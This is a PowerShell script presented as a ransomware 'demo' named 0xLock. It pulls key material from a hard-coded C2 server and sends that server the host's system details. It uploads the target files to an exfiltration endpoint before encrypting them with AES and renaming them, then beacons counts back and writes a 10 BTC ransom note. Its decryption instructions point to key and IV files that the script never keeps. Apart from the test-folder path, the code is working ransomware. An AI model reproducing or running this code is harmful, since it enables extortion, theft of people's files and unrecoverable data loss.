# 0xLock demo PS script for project

Add-Type -AssemblyName System.Security

# Test directory setup to avoid affecting real files
$testBaseDir = "C:\Temp\heartbeatDemo"
$testDir = "$testBaseDir\encryptMe"

# Create directories if they don't exist
New-Item -ItemType Directory -Force -Path $testDir | Out-Null

# C2 Configuration
$c2Server = "10.0.0.128"
$ransomNote = "Encrypted by 0xLocker! Visit https://0x4F776C.github.io for payment of 10 BTC. No decryptor available."
$base64Url = "http://$c2Server/files/update_key"
$fileExfilUrl = "http://$c2Server/exfil" # URL for file exfiltration

# Get payload from C2 server (or use default)
try {
    $base64String = (Invoke-WebRequest -Uri $base64Url -UseBasicParsing).Content
    $decodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64String))
    Write-Host "Retrieved and decoded payload from C2: $decodedPayload"
} catch {
    Write-Host "Failed to retrieve Base64 payload from C2. Using default simulation."
    $decodedPayload = "0x4F776C"
}

# Generate encryption key using the decoded payload
function Create-KeyFromPayload {
    param([string]$payload)
    
    # Create a SHA256 hash of the payload to use as part of the key
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    $payloadHash = $sha256.ComputeHash($payloadBytes)
    
    # Use the hash as our encryption key (SHA256 produces a 32-byte hash perfect for AES-256)
    return $payloadHash
}

# Create encryption key from payload
$encryptionKey = Create-KeyFromPayload -payload $decodedPayload

# Save the key for decryption demonstration
# $keyFile = "$testBaseDir\decryption_key.bin"
# [System.IO.File]::WriteAllBytes($keyFile, $encryptionKey)

# Generate InitVector for encryption (renamed from IV to avoid parameter conflict)
$initVector = New-Object byte[] 16
$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$rng.GetBytes($initVector)
$ivFile = "$testBaseDir\iv.bin"
[System.IO.File]::WriteAllBytes($ivFile, $initVector)

# Delete ivFile on disk
Remove-Item -Path $ivFile -Force

# Create some test files if the directory is empty
$fileCount = (Get-ChildItem $testDir -File -Recurse).Count
if ($fileCount -eq 0) {
    Write-Host "Creating test files in $testDir..."
    
    # Create a subdirectory for recursive demo
    $subDir = "$testDir\SubFolder"
    New-Item -ItemType Directory -Force -Path $subDir | Out-Null
    
    # Create test files with content
    "This is test file 1" | Out-File "$testDir\testfile1.txt"
    "This is test file 2" | Out-File "$testDir\testfile2.txt"
    "This is a document in a subfolder" | Out-File "$subDir\document.txt"
    
    # Create a small image file to test encryption
    $imgBytes = [byte[]]@(
        0x42, 0x4D, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x28, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00
    )
    [System.IO.File]::WriteAllBytes("$testDir\sample.bmp", $imgBytes)
}

# Function to transfer file to C2 server
function Transfer-FileToC2 {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [string]$C2Url
    )
    
    try {
        Write-Host "Transferring file $FilePath to C2..." -NoNewline
        
        # Ensure the file exists
        if (-not (Test-Path $FilePath)) {
            Write-Host " FAILED - File not found" -ForegroundColor Red
            return $false
        }
        
        # Get file name
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        # Use Invoke-RestMethod with form data approach
        $fileBin = [System.IO.File]::ReadAllBytes($FilePath)
        $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
        $fileEnc = $enc.GetString($fileBin)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream$LF",
            $fileEnc,
            "--$boundary--$LF"
        ) -join $LF
        
        $response = Invoke-RestMethod -Uri $C2Url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        
        Write-Host " SENT" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host " FAILED" -ForegroundColor Red
        Write-Host "Error transferring file: $_" -ForegroundColor Red
        return $false
    }
}

# Function to encrypt a file
function Encrypt-File {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,
        [Parameter(Mandatory=$true)]
        [byte[]]$AesIV,
        [Parameter(Mandatory=$false)]
        [bool]$SendToC2 = $false
    )
    
    try {
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        # Read file content
        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Send original file to C2 if requested (before encryption)
        if ($SendToC2) {
            # Create a temporary file with original content
            $tempFile = "$testBaseDir\temp_$fileName"
            [System.IO.File]::WriteAllBytes($tempFile, $fileContent)
            
            # Transfer the temporary file
            Transfer-FileToC2 -FilePath $tempFile -C2Url $fileExfilUrl
            
            # Clean up the temporary file
            Remove-Item -Path $tempFile -Force
        }
        
        # Create AES encryption object
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $Key
        $aes.IV = $AesIV
        
        # Create encryptor and encrypt data
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
        
        # Write encrypted data back to file
        [System.IO.File]::WriteAllBytes($FilePath, $encryptedData)
        
        # Rename file to indicate encryption
        $encryptedPath = "$FilePath.0xlock"
        Rename-Item -Path $FilePath -NewName $encryptedPath -Force
        
        return $true
    }
    catch {
        Write-Host "Error encrypting $FilePath`: $_" -ForegroundColor Red
        return $false
    }
}

# Function to decrypt a file
function Decrypt-File {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [Parameter(Mandatory=$true)]
        [byte[]]$Key,
        [Parameter(Mandatory=$true)]
        [byte[]]$AesIV
    )
    
    try {
        # Remove .0xlock extension for original filename
        $originalPath = $FilePath -replace '\.0xlock$', ''
        
        # Read encrypted content
        $encryptedContent = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Create AES decryption object
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $Key
        $aes.IV = $AesIV
        
        # Create decryptor and decrypt data
        $decryptor = $aes.CreateDecryptor()
        $decryptedData = $decryptor.TransformFinalBlock($encryptedContent, 0, $encryptedContent.Length)
        
        # Write decrypted data to original filename
        [System.IO.File]::WriteAllBytes($originalPath, $decryptedData)
        
        # Remove encrypted file
        Remove-Item -Path $FilePath -Force
        
        return $true
    }
    catch {
        Write-Host "Error decrypting $FilePath`: $_" -ForegroundColor Red
        return $false
    }
}

# Function to send system information to C2
function Send-SystemInfoToC2 {
    param(
        [string]$C2Url
    )
    
    try {
        # Gather system information
        $sysInfo = @{
            ComputerName = $env:COMPUTERNAME
            Username = $env:USERNAME
            Domain = $env:USERDOMAIN
            OSVersion = [System.Environment]::OSVersion.VersionString
            ProcessorCount = [System.Environment]::ProcessorCount
            SystemDirectory = [System.Environment]::SystemDirectory
            IPAddresses = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress -join ', '
        }
        
        # Convert to JSON
        $jsonData = $sysInfo | ConvertTo-Json
        
        # Send to C2
        $response = Invoke-WebRequest -Uri "$C2Url/sysinfo" -Method Post -Body $jsonData -ContentType "application/json" -UseBasicParsing
        
        Write-Host "Successfully sent system information to C2" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Failed to send system information: $_" -ForegroundColor Red
        return $false
    }
}

# Main encryption process
Write-Host "DEMO: Starting file encryption in $testDir" -ForegroundColor Yellow
Write-Host "Files will be encrypted with AES-256 using payload-derived key and renamed with .0xlock extension" -ForegroundColor Yellow
Write-Host "Selected files will be transferred to C2 server before encryption" -ForegroundColor Yellow

# Send system information to C2
Send-SystemInfoToC2 -C2Url "http://$c2Server"

# Create a file index to send to C2
$fileIndex = @()

# Process files recursively
$encryptedFiles = @()

# Select files for exfiltration
# $filesForExfil = Get-ChildItem $testDir -File -Recurse | Where-Object { $_.Extension -eq ".txt" -and $_.Length -lt 100MB } | Select-Object -First 100
$filesForExfil = Get-ChildItem $testDir -File -Recurse | Where-Object { $_.Length -lt 1GB }
$filesForExfilPaths = $filesForExfil | ForEach-Object { $_.FullName }

# Process all files
Get-ChildItem $testDir -File -Recurse | ForEach-Object {
    # Add to file index
    $fileIndex += @{
        Path = $_.FullName
        Size = $_.Length
        Type = $_.Extension
        LastModified = $_.LastWriteTime
        Selected = $filesForExfilPaths -contains $_.FullName
    }
    
    # Determine if this file should be sent to C2
    $sendToC2 = $filesForExfilPaths -contains $_.FullName
    
    # Encrypt the file (and send to C2 if selected)
    Write-Host "Encrypting $($_.FullName)..." -NoNewline
    if ($sendToC2) {
        Write-Host " (with exfiltration)" -NoNewline -ForegroundColor Yellow
    }
    
    $success = Encrypt-File -FilePath $_.FullName -Key $encryptionKey -AesIV $initVector -SendToC2 $sendToC2
    
    if ($success) {
        Write-Host " DONE" -ForegroundColor Green
        $encryptedFiles += $_.FullName + ".0xlock"  # Add with the new extension
    }
    else {
        Write-Host " FAILED" -ForegroundColor Red
    }
}

# Send file index to C2
try {
    $jsonIndex = $fileIndex | ConvertTo-Json
    $indexResponse = Invoke-WebRequest -Uri "http://$c2Server/fileindex" -Method Post -Body $jsonIndex -ContentType "application/json" -UseBasicParsing
    Write-Host "Successfully sent file index to C2" -ForegroundColor Green
} catch {
    Write-Host "Failed to send file index to C2: $_" -ForegroundColor Red
}

# Beacon back to C2 server with encrypted file count
try {
    $encryptedCount = $encryptedFiles.Count
    $exfilCount = $filesForExfilPaths.Count
    $beaconUrl = "http://$c2Server/beacon?host=$env:COMPUTERNAME&encrypted=$encryptedCount&exfiltrated=$exfilCount"
    Write-Host "Beaconing to C2 server: $beaconUrl" -ForegroundColor Yellow
    
    Invoke-WebRequest -Uri $beaconUrl -Method GET -UseBasicParsing | Out-Null
    Write-Host "Successfully beaconed to C2 server" -ForegroundColor Green
} catch {
    Write-Host "Failed to beacon to C2 server: $_" -ForegroundColor Red
}

# Create ransom note (for demonstration)
$demoNote = @"
DEMO RANSOM NOTE
----------------
$ransomNote

C2 Payload Used: $decodedPayload
Encrypted Files: $encryptedCount
Files Exfiltrated: $exfilCount
Host: $env:COMPUTERNAME

# Recovery Instructions (for demo only):
1. Use the decryption key saved at: $keyFile
2. Use the IV saved at: $ivFile

For each encrypted file, you can decrypt using:
`$key = [System.IO.File]::ReadAllBytes("$keyFile")
`$initVector = [System.IO.File]::ReadAllBytes("$ivFile")
# Then use the Decrypt-File function from this script with the AesIV parameter
Decrypt-File -FilePath "path\to\file.0xlock" -Key `$key -AesIV `$initVector
"@

$noteFile = "$testBaseDir\DEMO_RANSOM_NOTE.txt"
$demoNote | Out-File -FilePath $noteFile

Write-Host "`nEncryption demonstration complete with C2 integration and file exfiltration" -ForegroundColor Yellow
Write-Host "Demo ransom note written to: $noteFile" -ForegroundColor Green
Write-Host "Encrypted $encryptedCount files in $testDir" -ForegroundColor Red
Write-Host "Exfiltrated $exfilCount files to C2 server" -ForegroundColor Red
